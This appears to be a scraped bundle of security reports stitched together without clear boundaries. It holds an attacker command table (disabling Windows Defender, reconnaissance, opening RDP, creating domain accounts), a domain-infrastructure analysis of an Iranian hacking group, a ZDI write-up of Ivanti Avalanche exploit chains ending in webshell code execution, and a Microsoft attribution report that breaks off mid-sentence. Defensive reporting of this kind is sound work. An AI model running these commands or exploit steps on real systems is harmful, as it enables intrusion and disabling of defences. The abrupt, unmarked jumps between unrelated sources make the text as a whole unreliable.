OS Credential Dumping: NTDS [ T1003/003 ] The Variations in the playbook The overall structure of the infection chains remained the same across multiple intrusions in this campaign, primarily consisting of the cyber kill chain that we illustrated at the beginning of the campaign section. However, there were some key variations that consist of some optional activities conducted by the adversary in different intrusion sets. These variations include the use of: Credential harvesting using tools such as Mimikatz and Procdump. Proxy tools to set up SOCKs proxies. Reverse tunneling tools such as PuTTY's plink. It is therefore necessary to list all the TTPs used by the adversary across all the intrusions we've discovered in this campaign. This section provides an additional list of TTPs and commands used by the operators along with their corresponding MITRE ATT&CK IDs to help defenders better understand this APT's offensive playbook. Note: There is some overlap between operations (common or similar commands) carried out via the reverse shell, the VSingle RAT and impacket tools. This could be because there might be multiple human operators manually executing their own set of commands based on their shift days and timings (without proper handover of information collected and percolated from one operator to another). For example, in one instance, the attackers tried to obtain Active Directory information on one endpoint via PowerShell cmdlets. However, a day later, the attackers used adfind.exe to extract similar information on the same endpoint. Disabling AV components The threat actors used multiple variations of commands to query information about the installed antivirus software on the endpoints, followed by disabling the Windows Defender antivirus. Command Intent cmd /C wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayname Security Software Discovery [ T1518/001 ] wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get /format:list Security Software Discovery [ T1518/001 ] cmd.exe /Q /c wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe 1> \\127.0.0.1\ADMIN$\<log_file_name> 2>&1 Security Software Discovery [ T1518/001 ] cmd.exe /c powershell -exec bypass -Command Get-MpPreference Security Software Discovery [ T1518/001 ] powershell.exe -ExecutionPolicy Bypass -command Set-MpPreference -DisableRealtimeMonitoring $true Impair Defenses [ T1562/001 ] reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /s /f DisableRealtimeMonitoring Impair Defenses [ T1562/001 ] powershell -exec bypass -Command Set-MpPreference -SubmitSamplesConsent NeverSendpowershell -exec bypass -Command Set-MpPreference -MAPSReporting Disable Impair Defenses [ T1562/001 ] cmd.exe /c reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyWare /t REG_DWORD /d 1 Impair Defenses [ T1562/001 ] Reconnaissance During the reconnaissance and credential harvesting stage, the attackers gather information about the system, the network — including the domain — and the installed software. Using a WMIC command, the attackers also collect information about the logical drives of the infected systems. Then, the attackers harvest and exfiltrate credentials. During the reconnaissance stage, the attackers specifically check if the RDP port is open. If it is and the attackers decrypt any of the harvested credentials, they would have direct access to the system without the need to install any other backdoor. The complete list of commands is provided in the table below. Command Intent cmd.exe /c ipconfig /all Network discovery [ T1590 ] cmd.exe /c dir c:""Program Files (x86) Installed software [ T1518 ] cmd.exe /c dir c:""Program Files Installed software [ T1518 ] cmd.exe /c systeminfo System Information Discovery [ T1082 ] cmd /C qwinsta User Discovery [ T1033 ] cmd /C nslookup Network discovery [ T1590 ] cmd /C netstat -noa | findstr 3389 Network discovery [ T1590 ] cmd /C net view /domain Domain discovery [ T1087/002 ] cmd /C wmic logicaldisk get deviceid, size System Information Discovery [ T1082 ] cmd.exe /c reg query HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp System Information Discovery [ T1082 ] cmd.exe /Q /c wevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /c:20 /q:*[System [(EventID=25)]] /rd:true /f:text 1> \\127.0.0.1\ADMIN$\<impacket_log_file> 2>&1 Query event logs - Get RDP session reconnection information netsh advfirewall firewall add rule name=allow RemoteDesktop dir=in protocol=TCP localport=3389 action=allow Modify Firewall [ T1562/004 ] reg.exe add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 3389 /f Configure RDP [ T1021/001 ] Credential harvesting In some intrusions, the attackers saved copies of registry hives for subsequent exfiltration for obtaining credentials and policy information.

Command Intent cmd.exe /c <local_path>\adfind.bat Remote System Discovery [ T1018 ] adfind.exe -f (objectcategory=person) Remote System Discovery [ T1018 ] adfind.exe -f objectcategory=computer Remote System Discovery [ T1018 ] adfind.exe -f (objectcategory=organizationalUnit) Remote System Discovery [ T1018 ] adfind.exe -f (objectcategory=group) Remote System Discovery [ T1018 ] adfind.exe -gcb -sc trustdmp Domain Trust Discovery [ T1482 ] We also observed the use of dsquery to obtain similar information.

Similar activity was also seen being conducted via the VSingle implant as it was propagated across an enterprise. Command Intent net1 group /domain Domain discovery [ T1087/002 ] net1 user <username> <password> /domain Create Account [ T1136/002 ] net1 user <username> /active:yes /domain Create Account [ T1136/002 ] net1 group <groupname> /add /domain Create Account [ T1136/002 ] net1 group <groupname> <username> /add /domain Create Account [ T1136/002 ] Additional tools used In some cases, the attackers deployed commonly used tools often seen from other threat actors.

At that time, WhoisXML API threat researcher Dancho Danchev exposed more than 100 domains belonging to the group. This analysis was recently expanded to further explore the Iran-based threat group’s Internet-connected infrastructure. Our findings include: A sample of the additional artifacts obtained from our analysis is available for download from our website . The investigation began with a Gmail email address associated with the Ashiyane Digital Security Team. With the help of Reverse WHOIS API , 441 domain names registered using the email address were found. An extensive portfolio of 10,968 domains was also uncovered and considered related to the threat group. The properties are part of a domain privacy protection service believed to be managed by the Ashiyane Digital Security Team. Our analysis focused on retrieving as much information about the group’s infrastructure as possible, including lexical usage, administrative details, presence in malware engine databases, and website content. A bulk IP lookup for the domains we uncovered revealed that only about 35% currently resolve to different IP addresses. The top Internet service provider (ISP) is Limestone Networks, accounting for 21.3% of the domain resolutions. It is followed by Amazon, EGIHosting, Team Internet, Linode, Nforce Entertainment, Leaseweb, Peg Tech, Nocix, and Centrilogic. The rest of the domains are distributed across 164 other ISPs. In general, the domains are administered by domain privacy protection services. More than half of them use Media Elite Holdings Limited as registrar and employ the services of Fundacion Privacy Services Ltd. The other top registrars include eName, DropCatch, Sav.com, GoDaddy, OwnRegistrar, GMO Internet, NameSilo, Alibaba, and Namecheap. Despite being directly associated with the Ashiyane Digital Security Team, only about 1% of the properties have been flagged as malicious by various malware engines. We analyzed the most common text strings and top-level domains (TLDs) used in the domains connected to the Ashiyane Digital Security Team, as this can help security teams focus on what to look out for. Despite having thousands of TLD options, the domains in the study only use 13 TLDs. Close to 91% use the .com extension, while about 8% fall under the .net TLD. The remaining domains use .ir, .org, .info, .us, .xyz, biz, .me, .co, .asia, .wtf, or .pro. While generic terms, such as “free,” “online,” and “shop,” are used, you can also see geographically targeted strings like “usa,” “uk,” and “ny.” These are reflected in the word cloud below. The repeated appearance of “xn” suggests that several properties in the group’s network are internationalized domain names (IDNs). Many of them also use TLDs within the second-level domains (SLDs), such as wwwnew47com[.]com, linkedincom[.]com, richlifeco[.]com, and ashiyane-co[.]com. We analyzed the content of actively resolving domains using Website Screenshot API . Several are either parked or hosted index and 404 pages. Others host or redirect to pages with gambling, adult, e-commerce, and news content. Some interesting and possibly malicious content we found are shown below. The domains and their hosted content seem to impersonate legitimate businesses, such as Apple, Intuit, PayPal, and Walmart. Proactively monitoring digital properties connected to the Ashiyane Digital Security Team and other threat groups can be done by examining publicly available indicators of compromise (IoCs) and looking for shared DNS and WHOIS characteristics.

635124ad28e9d467ce428297,zdayinit,https://www.zerodayinitiative.com/blog/2022/9/7/riding-the-inforail-to-exploit-ivanti-avalanche-part-2,Riding the InfoRail to Exploit Ivanti Avalanche – Part 2,Piotr Bazydło,2022-09-08,"In my first blog post covering bugs in Ivanti Avalanche, I covered how I reversed the Avalanche custom InfoRail protocol, which allowed me to communicate with multiple services deployed within this product. This allowed me to find multiple vulnerabilities in the popular mobile device management (MDM) tool. If you aren’t familiar with it, Ivanti Avalanche allows enterprises to manage mobile device and supply chain mobility solutions. That’s why the bugs discussed here could be used by threat actors to disrupt centrally managed Android, iOS and Windows devices. To refresh your memory, the following vulnerabilities were presented in the previous post: · Five XStream insecure deserialization issues, where deserialization was performed on the level of message handling. · A race condition leading to authentication bypass, wherein I abused a weakness in the protocol and the communication between services. This post is a continuation of that research. By understanding the expanded attack surface exposed by the InfoRail protocol, I was able to discover an additional 20 critical and high severity vulnerabilities. This blog post takes a detailed look at three of my favorite vulnerabilities, two of which have a rating of CVSS 9.8: · CVE-2022-36971 – Insecure deserialization. · CVE-2021-42133 – Arbitrary file write/read through the SMB server. · CVE-2022-36981 – Path traversal, delivered with a fun authentication bypass. Each of these three vulnerabilities leads to remote code execution as SYSTEM. CVE-2022-36971: A Tricky Insecure Deserialization I discovered the first vulnerability when I came across an interesting class named JwtTokenUtility , which defines a non-default constructor that could be a potential target: At [1], the function base64-decodes one of the arguments. At [2], it checks if the publicOnly argument is true. If not, it deserializes the base64 decoded argument at [3]. This looks like a possible insecure deserialization sink. In addition, it is invoked from many locations within the codebase. The following screenshot illustrates several instances where it is invoked with the first argument set to false : Figure 1 - Example invocations of JwtTokenUtility non-default constructor It turned out that most of these potential vectors require control over the SQL database. The serialized object is retrieved from the database, and I found no direct way to modify this value. Luckily, there are two services with a more direct attack vector: the Printer Device Server and the Smart Device Server. The exploitation of both services is almost identical. We will focus on the Printer Device Server (PDS). Let’s have a look at the PDS AmcConfigDirector.createAccessTokenGenerator method: At [1], it uses acctApi.getGlobal to retrieve an object that implements IGlobal . At [2], it retrieves the pkk string by calling global.getAccessKeyPair . At [3], it decrypts the pkk string by calling PasswordUtils.decryptPassword . We are not going to analyze this decryption routine. This decryption function implements a fixed algorithm with a hardcoded key, thus the attacker can easily perform the encryption or decryption on their own. At [4], it invokes the vulnerable JwtTokenUtility constructor, passing the pkk string as an argument. At this point, we are aware that there is potential for abusing the non-default JwtTokenUtility constructor. However, we are missing two things: -- How can we control the pkk string? -- How can we reach createAccessTokenGenerator ? Let’s start with the control of the pkk string. Controlling the value of pkk To begin, we know that: -- The code retrieves an object to assign to the global variable. This object implements IGlobal . -- It calls the global.getAccessKeyPair getter to retrieve pkk . There is a Global class that appears to control the PDS service global settings. It implements the IGlobal interface and both the getter and the setter for the accessKeyPair member, so this is probably the class we’re looking for. Next, we must look for corresponding setAccessKeyPair setter calls. Such a call can be found in the AmcConfigDirector.processServerProfile method. At [1], processServerProfile accepts the config argument, which is of type PrinterAgentConfig . At [2], it retrieves a list of PropertyPayload objects by calling config.getPayload . At [3], the code iterates over the list of PropertyPayload objects. At [4], there is a switch statement based on the property.name field. At [5], the code checks to see if property.name is equal to the string ""webfs.ac.ppk"" . If so, it calls setAccessKeyPair at [6]. So, the AmcConfigDirector.processServerProfile method can be used to control the pkk value. Finally, we note that this method can be invoked remotely through a ServerConfigHandler InfoRail message: At [1], we see that this message type can be accessed through the subcategory 1000000 (see first blog post - Message Processing and Subcategories section). At [2], the main processMessage method is defined. It will be called during message handling. At [3], the code retrieves the message payload. At [4], it calls the second processMessage method. At [5], it deserializes the payload and casts it to the PrinterAgentConfig type. At [6], it calls processServerProfile and provides the deserialized config object as an argument. Success! We can now deliver our own configuration through the ServerConfigHandler method of the PDS server. This method can be invoked through the InfoRail protocol. Next, we need to get familiar with the PrinterAgentConfig class to prepare the appropriate serialized object. It has a member called payload , which is of type List<PropertyPayload> . PropertyPayload has two members that are interesting for us: name and value . Recall that the processServerProfile method does the following: -- Iterates through the list of PropertyPayload objects with a for loop. -- Executes switch statement based on PropertyPayload.name . -- Sets values based on PropertyPayload.value . With this in mind, we can understand how to deliver a serialized object and control the pkk variable. We have to prepare an appropriate gadget (we can use the Ysoserial C3P0 or CommonsBeanutils1 gadgets), encrypt it (decryption will be handled by the PasswordUtils.decryptPassword method) and deliver through the InfoRail protocol. The properties of the InfoRail message should be as follows: -- Message subcategory: 1000000. -- InfoRail distribution list address: 255.3.5.15 (PDS server). Here is an example payload: The first step of the exploitation is completed. Next, we must find a way to call the createAccessTokenGenerator function. Triggering the Deserialization Because the full flow that leads to the invocation of createAccessTokenGenerator is extensive, I will omit some of the more tedious details. We will instead focus on the InfoRail message that allows us to trigger the deserialization via the needFullConfigSync function. Be aware that the PDS server frequently performs synchronization operations, but typically does not perform a synchronization of the full configuration. By calling needFullConfigSync , a full synchronization will be performed, leading to execution of doPostDeploymentCleanup : At [1], the code invokes our target method, createAccessTokenGenerator . The following snippet presents the NotificationHandler message, which calls the needFullConfigSync method: At [1], the message subcategory is defined as 2200. At [2], the main processMessage method is defined. At [3], the payload is deserialized and casted to the NotifyUpdate type (variable nu ). At [4], the code iterates through the entries of the NotifyUpdateEntry object that was obtained from nu.getEntries . At [5], [6], and [7], the code checks to see if entry.ObjectType is equal to 61, 64, or 59. If one of the conditions is true, the code sets the universalDeployment variable to true value at [8], [9], or [10], so that needFullConfigSync will be called at [11]. The last step is to create an appropriate serialized message object. An example payload is presented below. Here, the objectType field is equal to 61. The attacker must send this payload through a message with the following properties: -- Message subcategory: 2200. -- InfoRail distribution list address: 255.3.5.15 (PDS server). To summarize, we must send two different InfoRail messages to exploit this deserialization issue. The first message is to invoke ServerConfigHandler , which delivers a serialized pkk string. The second message is to invoke NotificationHandler , to trigger the insecure deserialization of the pkk value. The final result is a nice pre-auth remote code execution as SYSTEM. CVE-2021-42133: One Vuln to Rule Them All - Arbitrary File Read and Write Ivanti Avalanche has a File Store functionality, which can be used to upload files of various types. This functionality has been already abused in the past, in CVE-2021-42125 , where an administrative user could: -- Use the web application to change the location of the File Storage and point it to the web root. -- Upload a file of any extension, such as a JSP webshell, through the web-based functionality. -- Use the webshell to get code execution. The File Store configuration operations are performed through the Enterprise Server, and they can be invoked through InfoRail messages. I quickly discovered three interesting properties of the File Store: These properties allow an attacker to freely exchange files between their SMB server and the Ivanti Avalanche local file system. In order to modify the File Store configuration, the attacker needs to send a SetFileStoreConfig message: At [1], the subcategory is defined as 1501. At [2], the standard Enterprise Server processMessage method is defined. The implementation of message processing is a little bit different in the Enterprise Server, although the underlying idea is the same as in previous examples. At [3] and [4], the method saves the new configuration values. The only thing that we must know about the saveConfig method is that it overwrites all the properties with the new ones provided in the serialized payload. Moreover, some of the properties, such as the username and password for the SMB share, are encrypted in the same manner as in the previously described deserialization vulnerability. To sum up this part, we must send an InfoRail message with the following properties: --Message subcategory: 1501. --Message distribution list: 255.3.2.5 (Enterprise Server). Below is a fragment of an example payload, which sets the File Store path to an attacker-controlled SMB server: Arbitrary File Read Scenario The whole Arbitrary File Read scenario can be summarized in the following picture: Figure 2 - Example scenario for the Arbitrary File Read exploitation The following screenshot presents an example exploitation of this scenario: Figure 3 - Exploitation of the Arbitrary File Read scenario As shown, the exploit is targeting the main Ivanti Avalanche directory: C:\Program Files\Wavelink\Avalanche . The following screenshot presents the exploitation results. Files from the Avalanche main directory were gradually copied to the attacker’s server: Figure 4 - Exploitation of the Arbitrary File Read scenario - results Arbitrary File Write Scenario The following screenshot presents the Arbitrary File Write scenario: Figure 5 - Example scenario for the Arbitrary File Write scenario The following screenshot presents an example exploitation attempt. It uploads a file named poc-upload.jsp to C:\Program Files\Wavelink\Avalanche\Web\webapps\ROOT : Figure 6 - Exploitation of the Arbitrary File Write scenario Finally, one can use the uploaded webshell to execute arbitrary commands. Figure 7 - Executing arbitrary code via the webshell CVE-2022-36981: Path Traversal in File Upload, Plus Authentication Bypass We made it to the final vulnerability we will discuss today. This time, we will exploit a path traversal vulnerability in the Avalanche Smart Device Server, which listens on port TCP 8888 by default. However, InfoRail will play a role during the authentication bypass that allows us to reach the vulnerable code. Path Traversal in File Upload Our analysis begins with examining the uploadFile method. At [1], the endpoint path is defined. The path contains two arguments: uuid and targetbasename . At [2], the doUploadFile method is called. Let’s start with the second part of the doUploadFile method, as I want to save the authentication analysis for later in this section. At [1], the uploadPath string is obtained by calling getUploadFilePath . This method accepts two controllable input arguments: uuid and baseFileName . At [2], the method instantiates a File object based on uploadPath . At [3], the method invokes writeToFile , passing the attacker-controlled input stream together with the File object. We will now analyze the crucial getUploadFilePath method, as this is the method that composes the destination path. At [1], it constructs deviceRoot as an object of type File . The parameters passed to the constructor are the hardcoded path obtained from getCachePath() and the attacker-controllable uuid value. As shown above, uuid is not subjected to any validation, so we can perform path traversal here. At [2], the code verifies that the deviceRoot directory exists. From here we see that uuid is intended to specify a directory. If the directory does not exist, the code creates it at [3]. At [4], it validates the attacker-controlled baseFileName against a regular expression. If the validation fails, baseFileName is reassigned at [5]. At [6], it creates a new filename fn , based on the current datetime, an integer value, and baseFileName . At [7], it instantiates a new object of type File . The path for this File object is composed from uuid and fn . After ensuring that the file does not already exist, the file path is returned at [8]. After analyzing this method, we can draw two conclusions: -- The uuid parameter is not validated to guard against path traversal sequences. An attacker can use this to escape to a different directory. -- The extension of baseFileName is not validated. An attacker can use this to upload a file with any extension, though the filename will be prepended with a datetime and an integer. Ultimately, when doUploadFile calls writeToFile , it will create a new file with this name and write the attacker-controlled input stream to the file. This makes it seem that we can exploit this as a path traversal vulnerability and write an arbitrary file to the filesystem. However, there are two major obstacles that will be presented in the next section. Authentication and Additional UUID Verification Now that we’ve covered the second part, let’s go back and analyze the first part of the doUploadFile method. At [1], the code retrieves the mysterious testFlags . At [2], it validates the length of the uuid , to ensure it is at least 5 characters long. At [3], it performs an authorization check (perhaps better thought of as an authentication check) by calling isAuthorized . This method accepts uuid , credentials ( authorization ), and testFlags . At [4], the code retrieves the deviceId based on the provided uuid . At [5], the code checks to see if any device was retrieved. If not, it checks for a specific value in testFlags at [6]. If this second check is also not successful, the code raises an exception. At [7], it calls allowUpload to perform one additional check. However, this final check has nothing to do with validating uuid . It only verifies the amount of available disk space, and this should not pose any difficulties for us. We can spot two potential roadblocks: -- There is an authentication check. -- There is a check on the value of uuid , in that it must map to a known deviceId . However, we can bypass this check if we could get control over testFlags . If testFlags & 0x100 is not equal to 0, the exception will not be thrown, and execution will proceed. Let’s analyze the most important fragments of the isAuthorized method: At [1], the method retrieves enrollmentId , found within the token submitted by the requester. At [2], it tries to retrieve the enrollment object from the database, based on enrollmentId . At [3], it checks to see if enrollment was retrieved. Supposing that enrollment was not retrieved successfully, the code checks for a particular value in testFlags at [4]. If not, it will return false at [6]. But if the relevant value is found in testFlags , the authentication routine will return true at [5], even though the requester’s authorization token did not contain a valid enrollmentId . Note that this method also checks an enrollment password, although that part is not important for our purposes. Here as well, testFlags can also be used to bypass the relevant check. Hence, if we can control testFlags , neither the authentication nor the uuid validation will cause any further trouble for us. Here is where InfoRail comes into play. It turns out that the Smart Device Server AgentTaskHandler message can be used to modify testFlags : At [1], it retrieves flagsToSet from the sds.modflags.set property. At [2], it obtains the Config Directory API interface. At [3], it uses flagsToSet to calculate the new flags value. At [4], it saves the new flag value. To sum up, an attacker can control testFlags , and use this to bypass both the authentication check and the uuid check. Exploitation Exploitation includes two steps. 1) Set testFlags to bypass the authentication and the uuid check. To modify the testFlags , the attacker must send an InfoRail message with the following parameters: -- Message subcategory: 2500. -- Distribution list: 255.3.2.17 (SDS server). -- Payload: 2) Exploit the path Traversal through a web request The path traversal can be exploited with an HTTP Request, as in the following example: The response will return the name of the uploaded webshell: Finally, an attacker can use the uploaded JSP webshell for remote code execution as SYSTEM. Figure 8 - Remote Code Execution with the uploaded webshell Conclusion I really hope that you were able to make it through this blog post, as I was not able to describe those issues with a smaller number of details (believe me, I have tried). As you can see, undiscovered attack surfaces can lead to both cool and dangerous vulnerabilities. It is something that you must look for, especially in products that are responsible for the administration of many other devices. This blog post is the last in this series of articles on Ivanti Avalanche research. However, I am planning something new, and yes, it concerns Java deserialization. Until then, you can follow me @chudypb and follow the team on Twitter or Instagram for the latest in exploit techniques and security patches.","['Ivanti', 'Deserialization', 'Research']",a258266e-d8ed-5f3e-a17b-a7a7ecce7f9b,"By understanding the expanded attack surface exposed by the InfoRail protocol, I was able to discover an additional 20 critical and high severity vulnerabilities in Ivanti Avalanche. This blog post takes a detailed look at three of my favorite vulnerabilities, two of which have a rating of CVSS 9.8: "
635124af28e9d467ce4282a7,microsoft,https://www.microsoft.com/security/blog/2022/09/08/microsoft-investigates-iranian-attacks-against-the-albanian-government/,Microsoft investigates Iranian attacks against the Albanian government,Microsoft Security Threat Intelligence,2022-09-08,"Shortly after the destructive cyberattacks against the Albanian government in mid-July, the Microsoft Detection and Response Team (DART) was engaged by the Albanian government to lead an investigation into the attacks. At the time of the attacks and our engagement by the Albanian government, Microsoft publicly stated that “Microsoft is committed to helping our customers be secure while achieving more. During this event, we quickly mobilized our Detection and Response Team (DART) to help the Albanian government rapidly recover from this cyber-attack. Microsoft will continue to partner with Albania to manage cybersecurity risks while continuing to enhance protections from malicious attackers.” This blog showcases the investigation, Microsoft’s process in attributing the related actors and the observed tactics and techniques observed by DART and the Microsoft Threat Intelligence Center (MSTIC) to help customers and the security ecosystem defend from similar attacks in the future. Microsoft assessed with high confidence that on July 15, 2022, actors sponsored by the Iranian government conducted a destructive cyberattack against the Albanian government, disrupting government websites and public services. At the same time, and in addition to the destructive cyberattack, MSTIC assesses that a separate Iranian state-sponsored actor leaked sensitive information that had been exfiltrated months earlier. Various websites and social media outlets were used to leak this information. There were multiple stages identified in this campaign: Initial intrusion Data exfiltration Data encryption and destruction Information operations Microsoft assessed with high confidence that multiple Iranian actors participated in this attack—with different actors responsible for distinct phases: DEV-0842 deployed the ransomware and wiper malware DEV-0861 gained initial access and exfiltrated data DEV-0166 exfiltrated data DEV-0133 probed victim infrastructure Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing MSTIC to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, the DEV reference is converted to a named actor: Microsoft assessed with moderate confidence that the actors involved in gaining initial access and exfiltrating data in the attack are linked to EUROPIUM, which has been publicly linked to Iran’s Ministry of Intelligence and Security (MOIS) and was detected using three unique clusters of activity. We track them separately based on unique sets of tools and/or TTPs; however, some of them may work for the same unit. Information specific to Albania is shared with permission from the Albanian government. Figure 1. Threat actors behind the attack against the Albanian government Forensic analysis Evidence gathered during the forensic response indicated that Iran-affiliated actors conducted the attack. This evidence includes, but is not limited to: The attackers were observed operating out of Iran The attackers responsible for the intrusion and exfiltration of data used tools previously used by other known Iranian attackers The attackers responsible for the intrusion and exfiltration of data targeted other sectors and countries that are consistent with Iranian interests The wiper code was previously used by a known Iranian actor The ransomware was signed by the same digital certificate used to sign other tools used by Iranian actors Intrusion and exfiltration A group that we assess is affiliated with the Iranian government, DEV-0861, likely gained access to the network of an Albanian government victim in May 2021 by exploiting the CVE-2019-0604 vulnerability on an unpatched SharePoint Server, administrata.al (Collab-Web2. *.* ), and fortified access by July 2021 using a misconfigured service account that was a member of the local administrative group. Analysis of Exchange logs suggests that DEV-0861 later exfiltrated mail from the victim’s network between October 2021 and January 2022. DEV-0861 was observed operating from the following IPs to exfiltrate mail: 144[.]76[.]6[.]34 176[.]9[.]18[.]143 148[.]251[.]232[.]252 Analysis of the signals from these IPs, and other sources, indicated that DEV-0861 has been actively exfiltrating mail from different organizations in the following countries since April 2020: Figure 2. Timeline of data exfiltration activities by DEV-0861 The geographic profile of these victims—Israel, Jordan, Kuwait, Saudi Arabia, Turkey, and the UAE—aligns with Iranian interests and have historically been targeted by Iranian state actors, particularly MOIS-linked actors. DEV-0166 was observed exfiltrating mail from the victim between November 2021 and May 2022. DEV-0166 likely used the tool Jason.exe to access compromised mailboxes. A public analysis of Jason.exe can be found here . Note that this tool was reportedly used by actors affiliated with MOIS. Figure 3. Screenshot of the Jason.exe tool Ransomware and wiper The cyberattack on the Albanian government used a common tactic of Iranian state sponsored actors by deploying ransomware first , followed by deployment of the wiper malware. The wiper and ransomware both had forensic links to Iranian state and Iran-affiliated groups. The wiper that DEV-0842 deployed in this attack used the same license key and EldoS RawDisk driver as ZeroCleare, a wiper that Iranian state actors used in an attack on a Middle East energy company in mid-2019. In that case, IBM X-Force assessed that actors affiliated with EUROPIUM gained initial access nearly a year ahead of the wiper attack. The wiper attack was subsequently performed by a separate and unknown Iranian actor. This is similar to the chain of events Microsoft detected against the Albanian government. The code used in this attack had the following properties: Filename SHA-256 cl.exe e1204ebbd8f15dbf5f2e41dddc5337e3182fc4daf75b05acc948b8b965480ca0 rwdsk.sys 3c9dc8ada56adf9cebfc501a2d3946680dcb0534a137e2e27a7fcb5994cd9de6 Embedded in the cl.exe wiper was the hex-string ‘B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D,’ which was the same license key used for the EldoS RawDisk driver of the ZeroCleare wiper documented by IBM X-Force in 2019. The Eldos driver is a legitimate tool that was also abused by the ZeroCleare wiper and was used to delete files, disks, and partitions on the target systems. While ZeroCleare is not widely used, this tool is being shared amongst a smaller number of affiliated actors including actors in Iran with links to MOIS. The ransomware payload used in this attack by the DEV-0842 operator had the following properties: Filename SHA-256 GoXml.exe f116acc6508843f59e59fb5a8d643370dce82f492a217764521f46a856cc4cb5 This tool was signed with an invalid digital certificate from Kuwait Telecommunications Company KSC. This certificate had a SHA-1 thumbprint of 55d90ec44b97b64b6dd4e3aee4d1585d6b14b26f. Microsoft telemetry indicates this certificate was only used to sign 15 other files—a very small footprint, suggesting the certificate was not widely shared amongst unrelated actor groups. Multiple other binaries with this same digital certificate were previously seen on files with links to Iran, including a known DEV-0861 victim in Saudi Arabia in June 2021: Filename SHA-256 Read.exe ea7316bbb65d3ba4efc7f6b488e35db26d3107c917b665dc7a81e327470cb0c1 It’s not clear if Read.exe was dropped by DEV-0861 on this Saudi victim or if DEV-0861 also handed off access to the Saudi victim to DEV-0842. Additional indications of Iranian state sponsorship The messaging, timing, and target selection of the cyberattacks bolstered our confidence that the attackers were acting on behalf of the Iranian government. The messaging and target selection indicate Tehran likely used the attacks as retaliation for cyberattacks Iran perceives were carried out by Israel and the Mujahedin-e Khalq (MEK) , an Iranian dissident group largely based in Albania that seeks to overthrow the Islamic Republic of Iran. Messaging The attacker’s logo is an eagle preying on the symbol of the hacking group ‘Predatory Sparrow’ inside the Star of David (Figure 4). This signals the attack on Albania was retaliation for Predatory Sparrow’s operations against Iran , which Tehran perceives involved Israel. Predatory Sparrow has claimed responsibility for several high-profile and highly sophisticated cyberattacks against Iran state-linked entities since July 2021. This included a cyberattack that disrupted television programming of the Islamic Republic of Iran Broadcasting (IRIB) with images saluting MEK leaders in late January. Predatory Sparrow forewarned about the attack hours ahead of time and claimed they supported and paid for it, indicating others were involved. Iranian officials blamed this cyberattack on the MEK and additionally blamed the MEK and Israel for a cyberattack that used the same images and messaging against the Tehran municipality in June . The message in the ransom image indicates that the MEK, a long-standing adversary of the Iranian regime, was the primary target behind their attack on the Albanian government. The ransom image, like several posts by Homeland Justice, the group overtly pushing messages and leaking data linked to the attack, asked “why should our taxes be spent on terrorists of Durres.” This is a reference to the MEK, who Tehran considers terrorists , who have a large refugee camp in Durrës County in Albania. Figure 4. Ransomware image and Homeland Justice banner The messaging linked to the attack closely mirrored the messaging used in cyberattacks against Iran, a common tactic of Iranian foreign policy suggesting an intent to signal the attack as a form of retaliation. The level of detail mirrored in the messaging also reduces the likelihood that the attack was a false flag operation by a country other than Iran. The contact numbers listed in the ransom image (Figure 4), for example, were linked to multiple senior Albanian leaders, mirroring the cyberattacks on Iran’s railways and fueling pumps, which included a contact phone number belonging to the Iranian Supreme Leader’s Office . The messages in the information operations also emphasized targeting of corrupt government politicians and their support for terrorists and an interest in not harming the Albanian people (Figure 5). Similarly, the attack on Iranian steel companies claimed to target the steel factories for their connections to the Islamic Revolutionary Guard Corps (IRGC) while avoiding harm to Iranians. Another cyberattack on an Iranian airline in late 2021, which was claimed by Hooshyaran-e Vatan (meaning “Observants of the Fatherland” in Farsi), emphasized Tehran’s corruption and misappropriation of money on IRGC activities abroad. Figure 5. Message from Homeland Justice days after the cyberattack. Timing The cyberattack on July 15 occurred weeks after a string of cyberattacks on Iran , one week ahead of the MEK-sponsored Free Iran World Summit and aligned with other Iranian policy moves against the MEK, further bolstering the likelihood of Iranian involvement. On July 16, the day after the cyberattack, Iran’s Ministry of Foreign Affairs issued a statement designating current and former American politicians for supporting the MEK. The Free Iran World Summit, which the Iranian regime actively opposes, was canceled this year following warnings of possible terrorist threats to the Summit on July 21. A few days after the planned Free Iran World Summit, Iranian official press issued an editorial calling for military action against the MEK in Albania. This string of events suggests there may have been a whole-of-government Iranian effort to counter the MEK from Iran’s Ministry of Foreign Affairs, to intelligence agencies, to official press outlets. Target selection Some of the Albanian organizations targeted in the destructive attack were the equivalent organizations and government agencies in Iran that experienced prior cyberattacks with MEK-related messaging. This suggests the Iranian government chose those targets to signal the cyberattacks as a form of direct and proportional retaliation, a common tactic of the regime. Parallel information operations and amplification Before and after the Homeland Justice messaging campaign was launched, social media persona accounts and a group of real-life Iranian and Albanian nationals known for their pro-Iran, anti-MEK views, promoted the campaign’s general talking points and amplified the leaks published by the Homeland Justice accounts online. The parallel promotion of the Homeland Justice campaign and its central themes by these entities in the online space—before and after the cyberattack—suggests a broad-based information operation aimed at amplifying the impact of the attack. Ahead of the cyberattack, on June 6, Ebrahim Khodabandeh, a disaffected former MEK member posted an open letter addressed to Albanian Prime Minister Edi Rama warning of the consequences of escalating tensions with Iran. Invoking “[h]acking of Tehran municipal systems” and “ gas stations ,” Khodabandeh claimed that the MEK was the source of “sabotaging acts against the interests of the Iranian people [sic]” and argued that these constituted “the hostile work of your government” and has caused “obvious enmity with the Iranian nation [sic].” Four days later, on June 10, Khodabandeh and the Nejat Society, an anti-MEK NGO that he heads, hosted a group of Albanian nationals in Iran. The group included members of another anti-MEK organization called the Association for the Support of Iranians Living in Albania (ASILA)—Gjergji Thanasi, Dashamir Mersuli, and Vladimir Veis. Given the highly political nature of ASILA’s work on issues related to a group that Tehran considers a terrorist organization (the MEK), it is highly possible that this visit was conducted with sanction from the state. Upon their return from Iran, on July 12, Nejat Society said Albanian police raided their offices and detained 